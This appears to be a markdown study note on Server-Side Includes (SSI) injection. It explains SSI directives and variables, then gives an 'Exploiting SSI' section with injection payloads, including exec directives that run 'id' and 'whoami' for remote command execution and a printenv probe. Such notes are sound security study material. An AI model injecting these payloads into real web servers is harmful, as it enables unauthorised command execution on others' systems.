Server-side includes (SSI) can be used to `generate HTML responses dynamically`. SSI directives instruct the webserver to include additional content dynamically. These directives are embedded into HTML files. SSI can be used to include content that is present in all HTML pages, such as headers or footers. The use of SSI can often be inferred from the file extension. Typical file extensions include `.shtml`, `.shtm`, and `.stm`. [Server-Side Includes (SSI) Injection](https://owasp.org/www-community/attacks/Server-Side_Includes_\(SSI\)_Injection) can occur when an attacker can inject malicious commands into the SSI directives. 
SSI utilizes `directives` to add dynamically generated content to a static HTML page. These directives consist of the following components :
- `name`: the directive's name
- `parameter name`: one or more parameters
- `value`: one or more parameter values
```ssi
# Example SSI directive
<!--#name param1="value1" param2="value" -->

# Prints environment variable
<!--#printenv -->

# Change error message
<!--#config errmsg="Error!" -->

# Execute command
<!--#exec cmd="whoami" -->

# Include specified file, ONLY IN THE WEB ROOT DIRECTORY
<!--#include virtual="index.html" -->
```
The `echo` directive prints the value of any variable given in the `var` parameter. Multiple variables can be printed by specifying multiple `var` parameters :
- `DOCUMENT_NAME`: the current file's name
- `DOCUMENT_URI`: the current file's URI
- `LAST_MODIFIED`: timestamp of the last modification of the current file
- `DATE_LOCAL`: local server time
```ssi
<!--#echo var="DOCUMENT_NAME" var="DATE_LOCAL" -->
```



# Exploiting SSI
- If when we input text in a field we're redirected to a page like `/page.shtml`, we can guess that the page supports SSI based on the file extension.
```ssi
# Print the environment variables
<!--#printenv -->

# RCE
<!--#exec cmd="id" -->
```
